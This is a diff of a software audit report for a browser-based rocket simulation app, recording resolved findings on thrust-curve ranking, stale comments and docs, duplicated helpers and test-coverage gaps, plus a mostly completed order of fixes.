+(a hosted catalog is never read from the build, even with the host down; these
+fail against the loader from before the change) and
+`tests/services/app/warmCatalogs.test.ts`.
+The finding as reported:
+The host copy wins whenever it parses. `isComponentRow`
+(`componentDb.ts:296-303`) accepts parachute rows without the new fields, and
+`parachutePatch` (`treeEdit.ts:543-551`) then falls back to 6 lines, default
+materials and no packed size. Fix: a schema version in the manifest; prefer the
+build's copy when the host's is older or different.
 
-## 🟢 Dead code
+**R3. LOW, FIXED | The default thrust curve can depend on API order** | `web/scripts/sync-motors.mjs:176-182, 213-221` | VERIFIED code, REPORTED variability
+Resolution: the ranking is `scripts/lib/rankCurves.mjs`, which ends on the
+file's thrustcurve.org `simfileId`, so two files that tie on source, format and
+sample count always come out the same way round. The sync refuses a file with
+no id rather than fall back to API order. Desktop has no fixed final key either
+(`ThrustCurveMotorSet`: sample count, then comment length, then insertion
+order). Pinned by `tests/services/motors/rankCurves.test.ts` (every order of
+three tied files ranks the same; fails against the comparator from before the
+fix). The catalog changes at the next sync.
+The finding as reported:
+Ties on source, format and sample count keep the API's order, and `curves[0]`
+is the default flight curve and sets the loaded mass. Five motors tie at index
+0: AeroTech H242 (241 vs 250 Ns), I195 (420 vs 466), I435 (552 vs 587), I284
+(585 vs 591), Hypertek J250 (716 vs 644). Fix: a final tie-break on the
+samples or file id.
 
-### Low
+## Upkeep
 
-- **D1** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/motorColumns.ts:35,63`. `Col.siScale` is declared and set on the diameter column, but nothing reads it: the scale is passed positionally to `cell()`. The length, mass and prop columns leave it unset, so the field is also inconsistent. Grep: `grep -rn siScale web/src` finds only the declaration, its doc comment, the cell() parameter and line 63. *Why it matters:* It is misleading metadata that suggests a generic lift to SI which does not exist. *Fix:* Remove the field, or make `cell` read c.siScale. |.
-- **D2** (LOW, CONFIRMED BY REVIEWER) `web/src/services/app/remoteData.ts:104`. `export class HttpError` is used only inside its own file (lines 132 and 181). Nothing in src, tests or e2e imports it. knip does not flag it. Grep: `grep -rn "HttpError" web/src web/tests web/e2e` returns only remoteData.ts:104, 107, 132 and 181. A script listed every src export not referenced from another src file. Of the 141 results, the other 140 are test-only exports of the intentional kind: test hooks such as `__setEngineForTests`, `setWeatherTransport`, `resetHelpIndex` and `forget*`, or the pure halves of download functions such as `exportCdx1`, `orkArchive` and `buildDesignCsv`. *Why it matters:* An unneeded export widens the module's surface and suggests other callers branch on it. *Fix:* Drop `export`.
-- **D3** (LOW, REPORTED) `web/src/state/store.ts:575`. The `export { hasThrustCurve }` re-export is imported only by tests/state/store.test.ts. Production code imports it from services/flight/runnability. *Why it matters:* It is a second import path whose comment claims a role it does not play. *Fix:* Delete it and point the test at runnability. Grep: `grep -rn "hasThrustCurve" src tests \| grep import` returns only runnability importers plus tests/state/store.test.ts:17.
-- **D4** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/ViewToggle.tsx:7`. The re-export `export { isResultView, type ViewMode }`: `type ViewMode` has no importer through this path, and `isResultView` is imported via ViewToggle only by useAutoRunOutdated.ts:5 (grep `from './ViewToggle'` over src/tests/e2e returns CenterToolbar and useAutoRunOutdated only) *Why it matters:* An indirection that hides the real owner (state/tabs) *Fix:* Import from state/tabs directly and drop the re-export |.
-- **D5** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/AeroAnalysis.tsx:22`. `export { buildLinePath, heat, hsv, niceName } from './aeroTables'` exists only for tests/components/canvas/aeroHeat.test.ts and linePath.test.ts (grep of src for imports from AeroAnalysis: CenterCanvas only, for the component) *Why it matters:* A test-only re-export through a component module *Fix:* Point the tests at aeroTables.ts and drop the re-export |.
-- **D6** (LOW, CONFIRMED BY REVIEWER) `web/src/services/flight/flightColumns.ts:130`. The `tc` column is declared with unit `ms`. The bridge never emits `tc` (OpenRocketEngine.java:1908-1916 excludes TYPE_COMPUTATION_TIME), and the kernel stores it in seconds (SimulationStatus.java:663-664). *Why it matters:* Unreachable entry with the wrong unit; it would mislabel the column if the bridge ever started emitting it. *Fix:* Drop the entry.
+No severity; not counted with the defects.
+
+**U1. A comment states something untrue or out of date** (done)
+Resolution: every comment below states the present constraint; the fixes for
+C2, C3, C12, C13, C14, C15, C31 and T4 had corrected some already. The code
+moves are made: `RocketSpec` lives in `tests/testing/specTree.ts`, the
+`flightConfigs.ts` separators are `\u0001` and `\u0002` escapes, and the
+`MaterialPicker` JSDoc sits on the component. Ground Track and the hourly
+landings read landing distances in the Downrange tile's scope
+(`sim.downrange`), pinned by `GroundTrack.test.tsx` and
+`EnvironmentLanding.test.tsx`.
+The list as reported:
+- Fixed with S1: `web/src/services/files/ork/importUnpack.ts` said "Streamed, so the count stops the inflation" of a reader that was not; the reader now is, and the comment describes the slices. `web/tests/services/files/designFile.test.ts:147-151` ("capped like a zip member's") is now true.
+- `web/src/services/motors/rseParser.ts:17-18`: "No `MotorDigest` ... nothing here does that". `ork/embeddedMotors.rseDigest` and `motorDigest.ts` do.
+- `web/src/services/files/ork/embeddedMotors.ts:74-78`: the `rseDigest` doc omits that desktop hashes MASS_SPECIFIC when `auto-calc-mass` is absent or true.
+- `web/src/services/files/rktImport.ts:527-529`: describes a tab depth rule desktop does not use (C13).
+- `web/src/services/motors/thrustcurve.ts:15`: "may also lack motorId"; `CatalogMotor` has no `motorId` field.
+- `web/src/services/storage/workspaceStore.ts:353`: "a design that no longer exists"; the check is "not the active design" (C31).
+- `web/src/services/storage/idbKeyValueStore.ts:279-287`: "A copy in the fallback is always the newer one" does not hold for a fallback built from a null seed (C12).
+- `tree/componentKinds.ts` `rollAngleOf` ("as the kernel flies it"), untrue for a lug or rail button angle past 180 degrees. See C3.
+- `web/src/components/design/MaterialPicker.tsx:33-44`: the component's JSDoc sits above `MaterialUse`.
+- `web/src/components/canvas/GroundTrack.tsx:67-68`: "Share the chart's unit scope". `FlightChart` uses unscoped `distance`; GroundTrack and `EnvironmentLanding.tsx:53` use `unitScope('sim','apogee')` while the Downrange tile uses `unitScope('sim','downrange')` (`SimSummary.tsx:179`), so the same landing distance can read in two units.
+- `web/src/components/canvas/Rocket3D.tsx:26-27`: "cylinders for tubes"; tubes are annulus lathes.
+- `web/src/services/report/layout.ts:235, 245`: `hexToRgbTuple` and `finSetsOf` "Exported for test"; both are used in `src`.
+- `web/src/services/report/markingGuide.ts:155-159`: fin rotation is written in `ork/exportParts.ts:305-307`, not `exportWriters.ts`.
+- `web/src/services/files/ork/exportDesignInfo.ts:~5`: "OpenRocket 24.12, the pinned upstream". The pinned upstream is `unstable` at 591c5e5; 24.12 is the desktop release.
+- `web/src/tree/placement.ts:17-20` ("separation 0 by default"), `web/src/tree/nodeProps.ts:112-117` (top, 0 is "the kernel's own default"), `web/src/tree/finPlanform.ts:190-200` (y-max is the span). See C2, C15, C14.
+- `web/src/engine/openRocketEngine.ts:27-28`: WASM-GC "(faster, smaller)"; the WASM is 2.7 MB against a 1.1 MB JS chunk.
+- `web/src/engine/openRocketEngine.ts:725-728`: `StaticInfo.cd` is filled by `computeStaticInfo` in `services/design/buildRocket.ts:109`, not the store.
+- `web/src/services/parts/componentDb.ts:16-21`: names `Parachute.loadPreset` (it is `loadFromPreset`) and says every other part folds mass into density; rail buttons use a mass override (`componentDb.ts:140-143`).
+- `web/src/services/flight/flightColumns.ts:8-11`: the app asks for `full` series (`simulations.ts:513`); only forecast runs use `summary`.
+- `web/src/services/design/treeEdit.ts:498-503`: `presetShoulder` is not applied as `Transition.loadFromPreset` applies it (`Transition.java:933-936, 949-952`); no shipped row has the differing shape.
+- `web/tests/srcExportReach.test.ts:67-68`: knip does not report a type exported only for tests. `RocketSpec` (`openRocketEngine.ts:493`) is used only by tests; move it to `tests/testing`.
+- `web/tests/scriptsReferenced.test.ts:176-178`: the self-match claim (T4).
+- `web/scripts/lib/digestCoverage.mjs:105-107`: "parts about 98%"; the pipeline gives 100%.
+- `.github/workflows/sync-catalogs.yml:12-13`: the local refresh recipe leaves out `npm run sync:database`.
+- `web/scripts/sync-examples.mjs:27-29`: only motors and components are served from the data branch.
+
+- `web/src/services/flight/flightConfigs.ts:430, 432`: the join separators are literal U+0001 and U+0002 characters in the source, invisible in an editor; write them as `'\u0001'` and `'\u0002'`. (A test comment in `orkImportHostile.test.ts` carried the same bytes and was rewritten with S2.)
+
+**U2. User and maintainer docs that state what the code does not do** (done)
+Resolution: AUDIT_PROMPT.md, `deploy.yml` and DEVELOPER.md say deploy runs no
+gate set but its build typechecks and lints; AUDIT_PROMPT.md and
+`a11y.spec.ts` name the import notes as the popup scanned open; ARCHITECTURE.md
+says `sync:motors` stages and `sync:motor-digests` writes, that the built-in
+materials come from the jar through `MaterialDump`, and that the digest step
+removes rows the build lacks and refuses per key and under the floors.
+The list as reported:
+- Fixed: `docs/DEVELOPER.md` said `npm run audit` runs `verify:ci`; it runs the coverage half, and now says so.
+- `docs/AUDIT_PROMPT.md:25`, `.github/workflows/deploy.yml:5`, `docs/DEVELOPER.md:196`: "deploy runs no gates"; `deploy.yml:83` runs `npm run build` (typecheck, lint, vite build).
+- `docs/AUDIT_PROMPT.md:27` and `web/e2e/a11y.spec.ts:541-545`: every popup is "scanned in the state the page does not open in". `LoadedBanner`'s notes open by default (`settings.ts:497`) and are scanned open (`a11y.spec.ts:619-623`); see also T1.
+- Fixed: `docs/AUDIT_PROMPT.md` pointed slice 1 at `engine-java/src/java/info/openrocket/core/file/`, which does not exist; it now names `engine-java/.openrocket-src/core/src/main/java/info/openrocket/core/file/`.
+- `docs/ARCHITECTURE.md:131`: `sync:motors` only stages; `sync:motor-digests` writes `public/data`.
+- `docs/ARCHITECTURE.md:167-168`: `sync-components` reads the jar's materials through MaterialDump (`materials.generated.json` only with `--internal`), and PresetDump reads the release's `.orc` files.
+- `docs/ARCHITECTURE.md:174`: rows the build lacks are removed, and the refusal rule is per key (`digestChanges`) plus the floors.
+
+**U3. A duplicated helper or list that has drifted** (done)
+Resolution: one `finalizeThrustCurve` port in `curveFinalize.ts`; `rseDigest`
+sorts before hashing and keeps desktop's mass and CG entry when a doubled
+t = 0 point is dropped (digests from OpenRocket 24.12 in `motorDigest.test.ts`).
+Save As offers `designNameOf` (`HeaderDialogs.test.tsx`). Settings number rows
+are `NumberRow` with `commitOnBlur`. Chart summaries use the shared
+`withUnit` ("12.3°"). One doc block in `MotorComparePane`. One built-in
+material map (`scripts/lib/builtInMaterials.mjs`) and one `arg()`
+(`scripts/lib/args.mjs`). One Aero chart wait (`aeroChartsDrawn` in
+`e2e/axe.ts`), and the Results scans use `resultView`. C2 and C16 were fixed
+already.
+The list as reported:
+- `web/src/services/motors/curveFinalize.ts:33-51` and `web/src/services/files/ork/embeddedMotors.ts:39-55`: two ports of `finalizeThrustCurve`; only one sorts first, and desktop sorts before hashing, so `rseDigest` misses on out-of-order rows (the designation match covers it today).
+- The line instance separation default of 0 in `exportWriters.ts:45`, `tree/placement.ts:28` and `importTags.ts:178` (C2).
+- `web/src/tree/nodeProps.ts`: `chainOuterRadius` and `bodyTubeRadius` disagree on a keyless tube (C16).
+- `web/src/components/layout/HeaderDialogs.tsx:73, 103`: Save As builds its own name chain and skips `tree.name`; `appInfo.ts:140` `designNameOf` is "the one copy". A rocket renamed in Rocket configuration is offered its file name.
+- `web/src/components/layout/SettingsTabs.tsx:437-490`: `NumRow`/`NumField` copy `common/NumberRow.tsx` (padding and unit width differ) because `NumberRow` has no `commitOnBlur`.
+- `web/src/components/canvas/chartSummary.ts:44`: a local `withUnit` that always inserts a space; the shared one (`i18n/format.ts:67`) attaches the degree sign, so screen reader summaries read "12.3 °".
+- `web/src/components/sim/MotorComparePane.tsx:12-16, 18-20`: the same doc block twice.
+- `web/scripts`: the built-in material density map is built from the jar in `sync-components.mjs:180-196` and from `materials.generated.json` in `sync-preset-digests.mjs:96-101`, which holds a material 24.12 lacks; `arg()` is copied five times with different missing-flag results.
+- `web/e2e/a11y.spec.ts:51` waits 20 s for the Aero chart, `a11y-phone.spec.ts:45` the default; `a11y.spec.ts:157-163` repeats `resultView` (`:235-239`).
+
+**U4. Gaps in the mechanical gates** (done)
+Resolution: the comment gate reads the web root configs, `website/src`, the
+workflow YAML (`#` comments) and `index.html` (`<!-- -->` and inline
+scripts). `geometryParity.kernel.test.ts` builds each listed case in its own
+stream (`withPlacements`) and compares shoulders, lug copies and spacing, pod
+and booster angles, inner tube placement fields, tube fin rotation, shifted
+freeform outlines, `absolute` and `after` tabs, keyless positions, the fin span,
+the report side view and the template profile against the kernel. It found C14
+on every tapered parent, C15, and C47. `geometryFlags.test.ts` adds the print
+export and the RockSim writer as readers, shape parameters, other shapes, a
+flag inside a pod, the ring measured itself in a synced design, and the fin
+parts table. The OBJ export is checked to be in millimeters. Each tube of a
+cluster is compared with where the kernel flies it (`getComponentGeometry`
+reports `clusterPoints` from `InnerTube.getInstanceOffsets`). The fin span is
+compared through the `getSpan` formula on the kernel's points, not `getSpan`
+itself, which the bridge does not report.
+The gaps as reported:
+- `commentsStateTheConstraint.test.ts` does not scan the web root configs, the workflow YAML, `website/src` or `index.html`. Scanned by hand with its patterns: no history comments found.
+- `geometryParity.kernel.test.ts` never builds: automatic transition ends wider than 25 mm with shoulders (C1); a lug with `instanceCount` above 1 or a keyless separation (C2); pod or booster `angleOffset` other than 0, or compares their angles; inner tube `clusterRotation`, `radialPosition` or `radialDirection`; a freeform outline not starting at [0, 0]; tab offset methods `absolute` or `after`; tube fin `rotation`; a keyless `position` (C15). It never compares `finSpan` with `getSpan`, and checks profiles only through `stationRadius`, not `rocketSideView` or `profileMm`.
+- `geometryFlags.test.ts`: no 'PDF parts table' in `FIN_READERS` (C14); no RockSim export in `READERS` or `UNAFFECTED` (`rktExport.ts:544, 677` read `flipped` and `profileEnds`); `rocketPrintExport.solidFor` only in `FIN_READERS`. One shape per part, `shapeParameter` never toggled, no flag set inside a pod; for the filled tube with a ring, four readers react only to the tube.
+- The `meshExport` test checks only the GLB magic (C6).
 
 ## Recommended order of attack
 
-Every fix lands with a test that fails without it.
+Each fix removes its `KNOWN` entries from `fieldReadback.kernel.test.ts` and `check-desktop-fields.mjs`; those checks are its test, and a fix not pinned by them needs one whose expected value comes from the kernel, the Java or desktop. Run the change audit (`docs/AUDIT_PROMPT_CHANGES.md`) on each batch.
 
-1. **S1, the CSV comment line.** One line in `csvExport.ts` plus a test case.
-   It is the same class as the closed S1 and the only open security finding at
-   MED.
-2. **C2, filled parts blocked from running.** Skip the `thickness` requirement
-   when `filled` is true. Small, verified, and it blocks real designs.
-3. **C3 and C4, the automatic radius one-liners.** Compute the tube fin radius
-   from the body, not the stored value, and use 0.025 as the fallback (fix the
-   test that pins 0.012).
-4. **The small verified state and form fixes:** C26 (`repairNotes` on New),
-   C25 and the inert "Flies" checkbox (show the refusal, no empty undo step),
-   C37 (a cleared override writes null, not 0), C27 (clamp cant to ±15°, as
-   `FinSet.setCantAngle` does), C38 (a maximum on the scale factor), C29
-   (`ColorInput` listener after remount), K1 (`lower_stage_separation` in
-   `DEPLOY_EVENTS`), C36 (`.rkt` CG-only override), C34 (desktop's gravity
-   spelling).
-5. **The MED accessibility list:** A1, A6, A7, A8, A9 and A11 are small markup
-   and handler changes. A2 and A10 need a text or icon beside the color. A3 and
-   A4 need the values in the live region. A5 extends the axe loop to the
-   Configs and Tools tabs and the non-default views, which will likely surface
-   more.
-6. **State and persistence:** C21 (`runSims` reports failure to its caller, so
-   the PDF export stops writing stale numbers), C20 (re-entrancy guard), C19
-   (`saveSync` respects a conflict), C22 (Save As strips results), C23
-   (opening a design does not autosave), C24 (hidden-tab apply waits for
-   sweeps and open dialogs).
-7. **C5 plus C15, C16 and C17, the automatic sizing port.** Port the kernel's
-   neighbor search (`getPreviousSymmetricComponent` and
-   `getNextSymmetricComponent`, chaining and stage crossing), the inner radius
-   at a part's own faces for discs and rings, and the overlap rule for
-   `mountBore`, then make new body tubes automatic as desktop does. Do these
-   together, with T1's kernel-backed tests, because they share one resolver.
-8. **C1, flipped nose cones.** Teach `shapeProfile` to flip, then check each
-   caller (schematic, report drawing, printable solid, automatic radius).
-9. **The 3D and canvas items:** C31 (mirrored scene basis), C32 (export the
-   flight on screen), C33 (handle snapshot rejection), C6 (pan in the zoomed
-   views), C7, C8, C28.
-10. **The flight REPORTED leads:** confirm C10 to C14 against the kernel before
-    changing anything, since four of them are REPORTED.
-11. **The LOW list,** by category: the conventions (i18n literals, comment
-    wording) and dead code can go in one sweep each; the rest as they are
-    touched.
-
+1. Done: **C43** and **C1**.
+2. Done: **C33**.
+3. Done: **S1**, **S2** and **S3**.
+4. Done: **C3**, **C37**, **C42**, **C10**, **C9** and **C6**.
+5. Done: **C2**, **C34** and **C44**.
+6. Done: **C12** and **C11**.
+7. Done: **C4**.
+8. Done: **C5**, **C8** and **C36**.
+9. Done: **C7**.
+10. Done: **T1** to **T4** and **U4**.
+11. **R1**: put the catalog pipeline on master and dispatch it.
+12. Done: **T5**.
+13. Done: the LOW findings, grouped by file: storage C19 to C21, C31 and C32; state C22; tree C14 to C16; importers C13, C17, C18; design C35, C39 and C47; launch panel C23; canvas C25 and C26; report C27 and C28; writers C29, C30, C38; reader C45.
+14. Done: upkeep U1 to U4.
